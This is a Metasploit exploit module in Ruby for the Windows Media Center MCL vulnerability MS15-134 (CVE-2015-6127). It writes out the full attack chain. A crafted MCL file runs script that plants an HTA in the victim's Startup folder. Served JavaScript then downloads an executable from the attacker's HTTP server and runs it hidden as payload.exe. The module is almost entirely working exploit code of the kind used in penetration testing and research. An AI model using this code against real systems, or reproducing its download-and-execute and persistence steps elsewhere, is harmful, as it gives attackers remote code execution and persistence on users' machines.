##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS15-134 Microsoft Windows Media Center MCL Self-Executing Vulnerability",
      'Description'    => %q{
        This module exploits a vulnerability found in Windows Media Center. It allows an MCL
        file to render itself as an HTML document in the local machine zone by Internet Explorer,
        which can turn into arbitrary code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Eduardo Prado',
          'sinn3r'
        ],
      'References'     =>
        [
          ['CVE', '2015-6127'],
          ['MSB', 'MS15-134'],
        ],
      'DefaultOptions'  =>
        {
          'EXITFUNC' => 'none',
          'DisablePayloadHandler' => 'false',
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          ['Windows 7', {}],
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Dec 8 2015",
      'DefaultTarget'  => 0))

    register_options([
      OptString.new('FILENAME',  [ true, 'The MCL file name.', 'msf.mcl'])
    ], self.class)

    register_advanced_options([
      # I guess if you have to configure this, it's bad news.
      OptString.new('DriveLetter', [true, 'Drive letter where Windows is installed', 'C'])
    ], self.class)
  end


  def generate_recordset_file
    # This way of generating a binary file without any documentation is not recommended.
    #
    # I was unable to find any documentation about this format, so basically I ended up
    # inspecting/binary-comparing a bunch of these files, and figured out this much.
    #
    # There also seems to be no cross-platform Ruby gem that can generate this for
    # me, so I'm out of luck.
    #
    # To learn how this file is generated manually, go to:
    # msf/external/source/exploits/CVE-2015-6127/recordset/
    @recordset_file ||= lambda {
      url = "#{get_uri}/#{@js_fname}"

      top_chunk = %Q|
      01 07 54 47 21 00 00 00 00 02 19 00 B6 92 F2 3F
      04 B2 CF 11 8D 23 00 AA 00 5F FE 58 01 00 00 00
      00 00 00 00 00 03 21 00 D2 AD 63 F6 02 EB CF 11
      B0 E3 00 AA 00 3F 00 0F 00 00 00 01 00 01 00 00
      00 00 00 00 00 FF FF FF FF 10 40 00 02 00 BE 22
      B5 C8 F3 5C CE 11 AD E5 00 AA 00 44 77 3D 03 00
      7F 00 00 00 02 00 00 00 86 00 00 00 02 00 00 00
      49 00 00 00 04 00 00 00 00 00 C1 3C 8E B6 EB 6D
      D0 11 8D F6 00 AA 00 5F FE 58 00 00 06|

      user_data_chunk = %Q|<script src=#{url}></script>|

      data_chunk  = "\x80\x01\x00\x01\x00"
      data_chunk << [user_data_chunk.length].pack('v')
      data_chunk << Rex::Text.to_unicode(user_data_chunk)
      data_chunk << "\x81\x00\xFF\x00\x00\x00\xFF\x00\x00\x00\xFF\x00"
      data_chunk << "\x00\x00\x68\x00\x00\x00\x00\x00\xFF\xFF\x0F"

      data_chunk_size = [data_chunk.length-1].pack('v')

      whole_chunk  = top_chunk.split.map {|b| b.hex.chr}.join
      whole_chunk << data_chunk_size
      whole_chunk << data_chunk

      print_line("\n#{Rex::Text.to_hex_dump(whole_chunk)}")

      whole_chunk
    }.call
  end


  def generate_mcl(hta_fname)
    %Q|
    <application url="#{datastore['FILENAME']}">
    <html>
    <script>
    function getUsername() {
      var a = document.location.href;
      var b = a.substring(8,300);
      while (b.indexOf('%20') > -1 )
      {
        b = b.replace('%20',' ');
      }
      var c = b.indexOf(String.fromCharCode(47));
      var d = b.indexOf(String.fromCharCode(47), c + 1);
      var e = b.indexOf(String.fromCharCode(47), d + 1);
      var ca = b.substring(c+1,d);
      var f = b.substring(d+1,e);
      return f;
    }

    function downloadRecordset() {
      var drive = "#{datastore['DriveLetter']}";
      var dest = drive + ":/users/" + getUsername();
      dest += "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
      dest += "#{hta_fname}";

      try {
        var ado = new ActiveXObject("ADODB.Recordset");
        ado.Open("#{get_uri}/#{@recordset_fname}");
        ado.Save(dest);
        ado.close();
      } catch(e) {
        // alert(e.message);
      }
    }

    downloadRecordset();
    </script>
    </html>
    </application>
    |
  end

  def get_js
    %Q|
    function save(dest, data) {
      var ado = new ActiveXObject("ADODB.Stream");
      ado.Open();
      ado.Type = 1;
      ado.Write(data);
      ado.SaveToFile(dest, 2);
    }

    function getTempFolder() {
      var f = new ActiveXObject("Scripting.FileSystemObject");
      var name = f.GetSpecialFolder(2);
      return name;
    }

    function exec(path) {
      var shell = new ActiveXObject("WScript.Shell");
      shell.run(path, 0);
    }

    var exeName = getTempFolder() + "\\payload.exe";
    var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    xmlHttp.Open("GET", "#{get_uri}/#{@executable_fname}", false);
    xmlHttp.send();
    if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
      save(exeName, xmlHttp.ResponseBody);
      exec(exeName);
    }
    |
  end

  def on_request_uri(cli, req)
    case req.uri
    when /#{@js_fname}/
      js = get_js
      print_status("Serving JavaScript file (#{js.length} bytes)")
      send_response(cli, js, {'Content-Type'=>'text/javascript'})
    when /#{@recordset_fname}/
      recordset = generate_recordset_file
      print_status("Serving recordset file (#{recordset.length} bytes)")
      send_response(cli, recordset, {'Content-Type'=>'text/plain'})
    when /#{@executable_fname}/
      exe = generate_payload_exe
      print_status("Serving EXE file (#{exe.length} bytes)")
      send_response(cli, exe, {'Content-Type'=>'application/octet-stream'})
    else
      print_error("Unknown URI requested: #{req.uri}")
      send_not_found(cli)
    end
  end

  def generate_cab
    @cab_file ||= lambda {
      path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-6127', 'exploit.cab')
      cab_file = ''
      File.open(path, 'rb') { |f| cab_file = f.read }
      cab_file
    }.call
  end

  def check_filename
    unless /\.mcl$/i === datastore['FILENAME']
      raise OptionValidateError, ["FILENAME (incorrect extension; must be .mcl)"]
    end
  end

  def setup
    check_filename
    super
  end

  def start_service
    super
    hta_fname = 'poc.hta'
    @recordset_fname  = 'recordset.txt'
    @js_fname         = "evil.js"
    @executable_fname = "executable"

    mcl = generate_mcl(hta_fname)
    file_create(mcl)
    print_status("Manually pass #{datastore['FILENAME']} to the target you wish to exploit.")
    print_status("If you wish to change the file name #{datastore['FILENAME']} to something else, make sure")
    print_status("to update the url attribute in the file to have a matching name as well.")
  end

end

